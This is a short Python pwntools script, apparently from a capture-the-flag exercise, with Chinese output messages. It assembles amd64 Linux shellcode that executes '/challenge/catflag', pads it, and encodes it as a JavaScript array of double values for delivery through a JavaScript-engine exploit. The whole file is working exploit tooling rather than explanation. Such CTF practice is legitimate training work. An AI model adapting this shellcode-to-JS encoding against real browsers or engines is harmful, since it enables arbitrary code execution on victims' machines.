from pwn import *

context.arch = 'amd64'
context.os = 'linux'

shellcode = shellcraft.execve("/challenge/catflag", 0, 0)
output = asm(shellcode)
print(f"Shellcode 长度: {len(output)} 字节")

if len(output) % 8 != 0:
    padding = 8 - (len(output) % 8)
    output += b'\x00' * padding
    print(f"已填充 {padding} 字节，总长度: {len(output)} 字节")

import struct

double_array = []
for i in range(0, len(output), 8):
    chunk = output[i:i+8]
    value = struct.unpack('<Q', chunk)[0]
    double_val = struct.unpack('<d', chunk)[0]
    double_array.append(repr(double_val))

js_array = "var shellcode = [\n    " + ",\n    ".join(double_array) + "\n];"

print("\nJavaScript double 数组格式:")
print(js_array)